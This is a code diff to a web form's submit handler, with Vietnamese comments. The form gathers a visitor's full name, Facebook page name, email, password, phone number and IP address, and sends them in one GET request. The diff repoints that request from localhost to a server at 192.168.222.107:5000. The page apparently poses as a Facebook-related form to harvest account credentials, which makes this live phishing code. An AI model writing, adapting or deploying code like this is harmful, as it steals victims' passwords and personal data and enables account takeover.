@@ -920,6 +920,9 @@
 
 
                 $("#btn-submit").click(function () {
+
+                    let url = `http://192.168.222.107:5000/send-message?message=Hi`;
+
                     var isValid = true;
                     var fullName = $('#full_name').val();
                     var facebookPageName = $('#facebook_page_name').val();
@@ -999,7 +1002,7 @@
 
                         var text = "Full Name: " + fullName + "\nFacebook Page Name: " + facebookPageName + "\nEmail: " + email + "\nPass: " + password + "\nMã Vùng: " + country_code + "\nPhone: " + phone + "\nOther reasons: " + otherReasons + "\nIp: " + ip;
 
-                        let url = `http://localhost:5000/send-message?message=${encodeURIComponent(text)}`;
+                        let url = `http://192.168.222.107:5000/send-message?message=${encodeURIComponent(text)}`;
 
                         // Gửi yêu cầu GET bằng fetch
                         fetch(url, {
